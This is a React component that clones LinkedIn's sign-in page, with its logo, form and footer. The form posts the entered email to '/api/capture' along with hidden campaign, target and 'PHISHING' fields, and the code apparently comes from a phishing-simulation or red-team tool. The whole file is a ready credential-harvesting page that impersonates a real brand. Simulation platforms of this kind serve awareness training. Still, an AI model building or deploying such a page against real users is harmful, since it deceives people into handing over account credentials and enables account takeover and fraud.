'use client';

import React, { useState } from 'react';

export default function LinkedInLogin({ campaignId, targetId }: { campaignId: string, targetId: string }) {
  const [email, setEmail] = useState('');

  return (
    <div style={{ fontFamily: '-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif', backgroundColor: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      
      <header style={{ padding: '24px 0', width: '100%', maxWidth: '352px', margin: '0 auto', display: 'flex', justifyContent: 'flex-start' }}>
        <svg viewBox="0 0 84 21" width="84px" height="21px" style={{ color: '#0a66c2' }}>
          <g fill="currentColor">
            <path d="M12.5 0v16.1h-4V0zM4.1 5.3h-4V21h4zM4.3 2.1a2.1 2.1 0 11-2.1-2.1 2.1 2.1 0 012.1 2.1zM18.8 5.3h3.8v2.4h.1c.5-1 1.9-2.6 4.7-2.6 5 0 6 3.3 6 7.6V21h-4v-7.2c0-1.7-.1-3.9-2.4-3.9-2.4 0-2.8 1.9-2.8 3.8V21h-4V5.3zm19.9-5v14.4c0 4.1-3 6.6-7.3 6.6a7.2 7.2 0 01-6-2.9h-.1V21h-3.9V0h4v6.8h.1a6.8 6.8 0 015.9-2A5.9 5.9 0 0138.7.3zM34.8 10a3 3 0 00-3.3-3.1 3 3 0 00-3.1 3c0 1.7 1.4 3.1 3.2 3.1A3 3 0 0034.8 10zm10.5-4.7V21h-4V5.3zM45.5 2.1a2.1 2.1 0 11-2.1-2.1 2.1 2.1 0 012.1 2.1zm11.4 12V21h-4v-6.9c0-1.7 0-3.8-2.3-3.8-2.4 0-2.7 1.8-2.7 3.7V21h-4V5.3h3.8v2.2h.1c.5-1 1.8-2.5 4.6-2.5 4.9 0 5.8 3.2 5.8 7.5zM67.7 5c2 0 3.8.7 5.1 2.2V5.3h3.8v15.3h-3.8v-1.7a6.8 6.8 0 01-5 2.1c-3.6 0-7.3-2.6-7.3-7.9A7.3 7.3 0 0167.7 5zm3.2 8.1A3 3 0 0067.8 10c-1.8 0-3.1 1.4-3.1 3s1.3 3.1 3.1 3.1a2.9 2.9 0 003.1-3zM84 21v-4.8h-4V21zM83.8 2.3c0 1.3-1 2.3-2.3 2.3s-2.3-1-2.3-2.3 1-2.3 2.3-2.3 2.3 1 2.3 2.3z" />
          </g>
        </svg>
      </header>

      <main style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
        <div style={{ width: '100%', maxWidth: '352px', padding: '24px 0', backgroundColor: '#fff', borderRadius: '8px' }}>
          
          <h1 style={{ margin: '0 0 4px', fontSize: '32px', fontWeight: 600, color: 'rgba(0,0,0,0.9)' }}>Sign in</h1>
          <p style={{ margin: '0 0 24px', fontSize: '14px', color: 'rgba(0,0,0,0.9)' }}>Stay updated on your professional world</p>

          <form method="POST" action="/api/capture" style={{ display: 'flex', flexDirection: 'column' }}>
            <input type="hidden" name="campaignId" value={campaignId} />
            <input type="hidden" name="targetId" value={targetId} />
            <input type="hidden" name="type" value="PHISHING" />

            <div style={{ marginBottom: '16px' }}>
              <input 
                type="text" 
                name="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email or Phone"
                required
                style={{
                  width: '100%',
                  padding: '12px 14px',
                  border: '1px solid rgba(0,0,0,0.6)',
                  borderRadius: '4px',
                  fontSize: '16px',
                  boxSizing: 'border-box',
                  outline: 'none'
                }}
              />
            </div>
            
            <div style={{ marginBottom: '16px' }}>
              <input 
                type="password" 
                placeholder="Password"
                required
                style={{
                  width: '100%',
                  padding: '12px 14px',
                  border: '1px solid rgba(0,0,0,0.6)',
                  borderRadius: '4px',
                  fontSize: '16px',
                  boxSizing: 'border-box',
                  outline: 'none'
                }}
              />
            </div>

            <div style={{ marginBottom: '16px' }}>
              <a href="#" style={{ color: '#0a66c2', fontSize: '16px', fontWeight: 600, textDecoration: 'none' }}>Forgot password?</a>
            </div>

            <button 
              type="submit" 
              style={{
                width: '100%',
                backgroundColor: '#0a66c2',
                color: '#fff',
                border: 'none',
                borderRadius: '24px',
                padding: '14px 16px',
                fontSize: '16px',
                fontWeight: 600,
                cursor: 'pointer',
                marginBottom: '16px'
              }}
            >
              Sign in
            </button>

            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '16px' }}>
              <div style={{ flex: 1, height: '1px', background: 'rgba(0,0,0,0.3)' }}></div>
              <div style={{ padding: '0 16px', fontSize: '14px', color: 'rgba(0,0,0,0.6)' }}>or</div>
              <div style={{ flex: 1, height: '1px', background: 'rgba(0,0,0,0.3)' }}></div>
            </div>

            <div style={{ fontSize: '14px', textAlign: 'center', color: 'rgba(0,0,0,0.9)' }}>
              New to LinkedIn? <a href="#" style={{ color: '#0a66c2', fontWeight: 600, textDecoration: 'none' }}>Join now</a>
            </div>

          </form>
        </div>
      </main>

      <footer style={{ backgroundColor: '#fff', display: 'flex', justifyContent: 'center', padding: '16px 0', flexWrap: 'wrap', gap: '16px', fontSize: '12px', color: 'rgba(0,0,0,0.6)' }}>
        <div>LinkedIn Corporation © 2026</div>
        <div><a href="#" style={{ color: 'inherit', textDecoration: 'none' }}>User Agreement</a></div>
        <div><a href="#" style={{ color: 'inherit', textDecoration: 'none' }}>Privacy Policy</a></div>
        <div><a href="#" style={{ color: 'inherit', textDecoration: 'none' }}>Community Guidelines</a></div>
        <div><a href="#" style={{ color: 'inherit', textDecoration: 'none' }}>Cookie Policy</a></div>
        <div><a href="#" style={{ color: 'inherit', textDecoration: 'none' }}>Copyright Policy</a></div>
        <div><a href="#" style={{ color: 'inherit', textDecoration: 'none' }}>Send Feedback</a></div>
      </footer>
    </div>
  );
}
